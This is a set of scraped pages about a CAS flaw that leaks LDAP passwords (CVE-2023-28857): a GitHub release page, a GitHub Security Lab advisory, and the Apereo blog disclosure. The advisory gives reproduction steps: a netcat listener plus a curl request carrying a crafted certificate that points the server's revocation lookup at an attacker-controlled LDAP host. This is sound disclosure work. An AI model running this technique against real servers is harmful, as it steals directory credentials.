=== Content from github.com_16325264_20250114_191303.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapereo%2Fcas%2Freleases%2Ftag%2Fv6.6.6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapereo%2Fcas%2Freleases%2Ftag%2Fv6.6.6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=apereo%2Fcas)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[apereo](/apereo)
/
**[cas](/apereo/cas)**
Public

* [Notifications](/login?return_to=%2Fapereo%2Fcas) You must be signed in to change notification settings
* [Fork
  3.9k](/login?return_to=%2Fapereo%2Fcas)
* [Star
   11k](/login?return_to=%2Fapereo%2Fcas)

* [Code](/apereo/cas/tree/v6.6.6)
* [Pull requests
  3](/apereo/cas/pulls)
* [Actions](/apereo/cas/actions)
* [Security](/apereo/cas/security)
* [Insights](/apereo/cas/pulse)

Additional navigation options

* [Code](/apereo/cas/tree/v6.6.6)
* [Pull requests](/apereo/cas/pulls)
* [Actions](/apereo/cas/actions)
* [Security](/apereo/cas/security)
* [Insights](/apereo/cas/pulse)

1. [Releases](/apereo/cas/releases)
2. [v6.6.6](/apereo/cas/releases/tag/v6.6.6)

# v6.6.6

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/apereo/cas/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v6.6.6)

 Loading

[View all tags](/apereo/cas/tags)

![@mmoayyed](https://avatars.githubusercontent.com/u/1205228?s=40&v=4)
[mmoayyed](/mmoayyed)
released this
17 Mar 05:02

·
[4661 commits](/apereo/cas/compare/v6.6.6...master)
to master
since this release

[v6.6.6](/apereo/cas/tree/v6.6.6)

[`adee006`](/apereo/cas/commit/adee006544f6e82d43606ff0512b8d93853da3d6)

Please see [this post](https://apereo.github.io/2023/02/20/x509-vuln/).

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_29088c13_20250114_191304.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

June 27, 2023
# GHSL-2023-009: Credentials leaks for LDAP authentication in Apereo CAS - CVE-2023-28857

[![Author avatar](https://avatars.githubusercontent.com/u/44605151)
Michael Stepankin](https://github.com/artsploit)

## Coordinated Disclosure Timeline

* 2023-02-20: Report sent to cas-appsec-private@apereo.org
* 2023-02-20: Acknowledged and fixed, version 6.6.6 is available to download via cas-overlay
* 2023-02-20: Maintainer issues [a public post](https://apereo.github.io/2023/02/20/x509-vuln/) describing the problem

## Summary

When CAS is configured to use X509 certificate authentication with LDAP directory, an unauthenticated user can leak the credentials for LDAP authentication. This is possible by sending a specially crafted X509 client certificate that contains a “CRL Distribution Points” extension with URLs pointing to a malicious resource.

## Product

Apereo CAS

## Tested Version

[v6.6.4](https://github.com/apereo/cas/releases/tag/v6.6.4)

## Details

### LDAP password leak in `X509CredentialsAuthenticationHandler.java` (`GHSL-2023-009`,`CVE-2023-28857`)

Apereo CAS can be configured to use authentication based on client X509 certificates. These certificates can be provided via TLS handshake or a special HTTP header, such as “ssl\_client\_cert”. When checking the validity of the provided client certificate, [X509CredentialsAuthenticationHandler](https://github.com/graciantrivino/cas/blob/b90003f43a8ac0382d5416ceb01074feb936bf24/cas-server-support-x509/src/main/java/org/jasig/cas/adaptors/x509/authentication/handler/support/X509CredentialsAuthenticationHandler.java#L231) performs check that this certificate is not revoked. To do so, it fetches URLs provided in the “CRL Distribution Points” extension of the certificate, which are taken from the certificate itself and therefore can be controlled by a malicious user.
If the CAS server is configured to use an LDAP server for x509 authentication with a password, for example by setting a “cas.authn.x509.ldap.ldap-url” and “cas.authn.x509.ldap.bind-credential” properties, `X509CredentialsAuthenticationHandler` fetches revocation URLs from the certificate, which can be LDAP urls. When making requests to this LDAP urls, Apereo CAS **uses the same password** as for initially configured LDAP server, which can lead to a password leak.

Note: X509CredentialsAuthenticationHandler only checks date validity, revocation, but not validity of signature of the provided certificate. So, in order to exploit the issue, even an untrusted self-signed certificate can be used. If Apereo CAS is placed behind a reverse proxy, which checks the validity of TLS certificate, this vulnerability can still be exploited, but an attacker needs to somehow craft a signed certificate with a CRLDP extension.

#### Steps to reproduce

1. Download CAS Overlay v6.6.4 from cas-initializer (https://casinit.herokuapp.com/ui), including `cas-server-support-x509` and `cas-server-support-rest-x509` dependencies. Unzip it to a local folder.
2. Build it using the following commands for example:`./gradlew clean build`, `mkdir /etc/cas`, `./gradlew createKeystore` and `./gradlew copyCasConfiguration`
3. Start Apereo CAS with the following parameters\*:
   ```
   cas.authn.x509.crl-fetcher=ldap \
   cas.authn.x509.extract-cert=true \
   cas.authn.x509.ldap.base-dn=o\=tomcat \
   cas.authn.x509.ldap.bind-credential=s3cr3taaaaa \
   cas.authn.x509.ldap.bind-dn=admin \
   cas.authn.x509.ldap.ldap-url=ldap://example.com:1389/ \
   cas.authn.x509.ldap.search-filter=cn\={user} \
   cas.authn.x509.revocation-checker=crl \
   cas.rest.x509.header-auth=true \
   java -jar ./build/libs/cas.war

   ```

   It will start a CAS instance that uses LDAP server at located `ldap://example.com:1389/` with `admin` and `s3cr3taaaaa` credentials. It will also enable revocation checking using LDAP.
4. Open a netcat listener on the localhost or any accessible network device:
   ```
   nc -lv 1389

   ```
5. Next send a request with a malicious certificate that contains a URL for the attacker-controlled LDAP server **ldap://localhost:1389/** in the CRLDP extension:
   ```
   curl -i -s -k -X POST https://localhost:8443/cas/v1/tickets/ \
   -H $'ssl_client_cert: -----BEGIN CERTIFICATE----- MIIDQzCCAiugAwIBAgICBTkwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UEAwwMVHJ1c3QgQW5jaG9yMB4XDTIzMDExNjE3MTAzMFoXDTIzMDQyNjE3MTAzMFowEjEQMA4GA1UEAxMHQ0EgQ2VydDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM0espevAmhaLlqMdm0dnQ3oZmvGz9b8CFOqGOn6Y6zOtqjE26VeW+sqvxRktOpFzI+0UubaPLHJQFv0j/3adg4/7TUEHDwFMlj863CMMUlLFmBhWWMTIaKadC1Xbfd9wVzMw5mK72MWRvgkt0budelQPMbBWNzezYcGWQejfGn/yTl3NPPZVUbokKwWOUKpAO7BNNyLABkLl9S6iu86Bnd2hMCWWaUij344/hr6LCNAZj8u+VNk6AHsdQ3+yX2cBxrKUaf9atWZfSGk+1FXTnhygx3u0MG19T/QUoSGf3tbKVXrj9GCn8Cxyqc7XNl/9AVEVt4LK6nuk9QFX0zW/vsCAwEAAaOBnTCBmjAdBgNVHQ4EFgQUCNxRyUrdI+K9zYVIrqkaS4SznswwPwYDVR0jBDgwNoAUAfdL5C2O2UfK9x+wcKpn49gAm9ShG6QZMBcxFTATBgNVBAMMDFRydXN0IEFuY2hvcoIBATAPBgNVHRMECDAGAQH/AgEAMCcGA1UdHwQgMB4wHKAaoBiGFmxkYXA6Ly9sb2NhbGhvc3Q6MTM4OS8wDQYJKoZIhvcNAQELBQADggEBADoTyg36gr1GglAXOwh6UMcm1oe5TkEHkW+6sk2Zxdx2P2c2X74U8PUQdCcjxauWxJPCY5VghETIIb+vLIoNGEArHCGFEg/vCW+0fYZbCjAVvo7jPqbVFplb5BLUrXh+7hBPsLu6CrJZztcqDnqGEQUXTeV0DMrCIinmS/gu2e0Vad8Zfp0gMpbe7GralzTZZczab8DZ3C31cteBjEjxXTlI8tU4DMNnmNRT32/bDSmRoNrV10XpglMaDbYOFk9FZh5y+820Nmb2jsljUbioJ2OHwKO4TYawW01d2U0VpAO7IIAap+9SEKolu519MocrLFMp2uHrx0v4sOLHKtXiqGY=-----END CERTIFICATE-----'

   ```
6. When processing this request, the vulnerable CAS server initiates a connection to user-provided URL `https://localhost:1389/` with the username and password initially configured for `ldap://example.com:1389/`.

   ![leak](/assets/img/post-images/GHSL-2023-009-Apereo/leak.png)

\* This is just an example configuration for easy testing, in real production systems it might be different but still vulnerable.

#### Impact

An unauthenticated user can leak the password used to LDAP connection configured on server.

## CVE

* CVE-2023-28857

## Credit

This issue was discovered and reported by GHSL team member [@artsploit (Michael Stepankin)](https://github.com/artsploit).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-009` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from apereo.github.io_be506c95_20250114_191300.html ===


[Apereo Community Blog](https://apereo.github.io)
[About](/about/)
[Say Hello](/contact/)
[All Posts](/tags/)
[Search](/search/)

# CAS X.509 Vulnerability Disclosure

Monday, Feb 20, 2023

2 minute read

# Overview

This is the initial version of an [Apereo CAS project vulnerability disclosure](https://apereo.github.io/cas/developer/Sec-Vuln-Response.html),
describing an issue in CAS deployment that supports accepting X.509 credentials as part of the CAS REST API where the X.509 functionality is configured to handle revocation via LDAP.

If you are not using the X.509 workflow or CAS REST API, there is nothing to do here. Keep calm and carry on.

For additional details on how security issues, patches and announcements are handled, please read the [Apereo CAS project vulnerability disclosure](https://apereo.github.io/cas/developer/Sec-Vuln-Response.html) process.

# Credits

The issue was originally reported by Michael Stepankin, a member of the the GitHub Security Lab team. Michael was also kind enough to supply a fix, which was incorporated into the published releases. Thank you!

# Affected Deployments

The security issue described here, [per the CAS maintenance policy](https://apereo.github.io/cas/developer/Maintenance-Policy.html), affects the Apereo CAS server for the following versions:

```
- 6.5.x
- 6.6.x

```

If your CAS version is not listed above *AND* is still part of an active maintenance cycle [per the CAS maintenance policy](https://apereo.github.io/cas/developer/Maintenance-Policy.html), then best effort (analysis or confirmation from reporters/testers) indicates that the version is not affected by this issue. That said, please note that per the project’s Apache2 license, *software distributed under the License is distributed on an “AS IS” BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.*. For additional information, please [see the project license](https://github.com/apereo/cas/blob/master/LICENSE).

If you or your institution is a member of the Apereo foundation with an active support subscription supporting the CAS project, please [contact the CAS subs working group](https://apereo.github.io/cas/Mailing-Lists.html) to learn more about this security vulnerability report.

# Severity

When the CAS REST API is turned on and is configured to accept X.509 credentials and CAS is configured to handle CRL revocation via LDAP, the underlying issue allows an attacker to gain insight into the configuration of the running CAS instance by crafting a special malicious certificate. If Apereo CAS is placed behind a reverse proxy, which checks the validity of certificate, this vulnerability can still be exploited, but an attacker needs to somehow craft a signed and yet malicious certificate.

# Timeline

The issue was originally reported on Monday February 21st, 2023 and upon confirmation, CAS releases were patched and published on Monday February 21st, 2023.

# Patching

Patch releases are available to address CAS deployments. Upgrades to the next patch version for each release should be a drop-in replacement.

## Procedure

### 6.5.x

Modify your CAS overlay to point to the version `6.5.9.1`.

### 6.6.x

Modify your CAS overlay to point to the version `6.6.6`.

# Support

Apereo CAS is Apache v2 open source software under the sponsorship of the Apereo Foundation, supported by community volunteers and enthusiasts. Support options may be [found here](https://apereo.github.io/cas/Support.html).

If you or your institution is a member of the Apereo foundation with an active subscription supporting the CAS project, please [contact the CAS subs working group](https://apereo.github.io/cas/Mailing-Lists.html) to learn more about this security vulnerability report.

# Resources

* [CAS Security Vulnerability Response Model](https://apereo.github.io/cas/developer/Sec-Vuln-Response.html)
* [CAS Maintenance Policy](https://apereo.github.io/cas/developer/Maintenance-Policy.html)

On behalf of the CAS Application Security working group,

[Misagh Moayyed](https://fawnoos.com)

Share this post!

Follow Apereo on [Twitter](https://twitter.com/Apereo).

### Related Posts

[#### CAS OAuth/OpenID Connect Vulnerability Disclosure

Disclosure of a security issue with the Apereo CAS software acting as an OAuth/OpenID Connect provider.](/2024/06/26/oidc-vuln/)

[#### CAS OAuth/OpenID Connect Vulnerability Disclosure

Disclosure of a security issue with the Apereo CAS software acting as an OAuth/OpenID Connect provider.](/2024/05/18/oauth-vuln/)

[#### Apereo CAS is now on Develocity

An overview of how Apereo CAS is using Gradle and Develocity to improve its build and test execution cycle.](/2024/03/09/develocity/)

[#### CAS OAuth/OpenID Connect Vulnerability Disclosure

Disclosure of a security issue with the Apereo CAS software acting as an OAuth/OpenID Connect provider.](/2023/09/14/oauth-vuln/)

[#### CAS Groovy Vulnerability Disclosure

Disclosure of a security issue with the Apereo CAS software when using Groovy.](/2023/08/30/groovy-vuln/)

[#### CAS OpenID Connect Vulnerability Disclosure

Disclosure of a security issue with the Apereo CAS software acting as an OpenID Connect Provider.](/2023/07/21/oidc-vuln/)

[#### CAS OpenID Connect Vulnerability Disclosure

Disclosure of a security issue with the CAS software acting as an OpenID Connect Provider.](/2022/08/03/oidc-vuln/)

[#### CAS OpenID Connect Vulnerability Disclosure

Disclosure of a security issue with the CAS software acting as an OpenID Connect Provider.](/2022/07/01/oidc-vuln/)

[#### CAS OpenID Connect Vulnerability Disclosure

Disclosure of a security issue with the CAS software acting as an OpenID Connect Provider.](/2022/06/23/oidc-vuln/)

[#### CAS Spring Framework RCE Vulnerability Disclosure

Disclosure of the Spring framework RCE security issue with the Apereo CAS software.](/2022/03/31/spring-vuln/)

Theme crafted with <3 by [John Otander](http://johnotander.com) ([@4lpine](https://twitter.com/4lpine)).

</> available on [Github](https://github.com/johnotander/pixyll).


